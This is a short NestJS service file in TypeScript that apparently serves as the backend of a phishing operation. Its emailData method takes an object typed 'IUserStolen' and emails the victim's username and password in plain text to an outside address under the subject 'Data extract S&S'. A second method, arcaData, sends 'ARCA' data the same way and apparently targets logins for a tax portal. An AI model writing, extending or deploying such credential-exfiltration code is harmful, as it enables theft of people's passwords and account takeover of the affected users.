import { Injectable } from '@nestjs/common';
import { IUserStolen } from './utils/interfaces';
import { MailerService } from '@nestjs-modules/mailer';

@Injectable()
export class AppService {
  constructor(private readonly mailerServ: MailerService) {}
  getHello(): string {
    return 'Hello World!';
  }

  async emailData(req: IUserStolen): Promise<void> {
    const msg = "Datos: "+req.user+" / "+req.password;
    await this.mailerServ.sendMail({
        from: `Lucas Macchi <gestionpedidos@solucionesyservicios.online>`,
        to: 'lmacchi@solucionesyservicios.com.ar',
        subject: 'Data extract S&S',
        text: msg
    })
  }

  async arcaData (data: string): Promise<void> {
    const msg = "ARCA DATOS: "+data
    await this.mailerServ.sendMail({
        from: `Lucas Macchi <gestionpedidos@solucionesyservicios.online>`,
        to: 'lmacchi@solucionesyservicios.com.ar',
        subject: 'Data ARCA extract S&S',
        text: msg
    })
  }
}
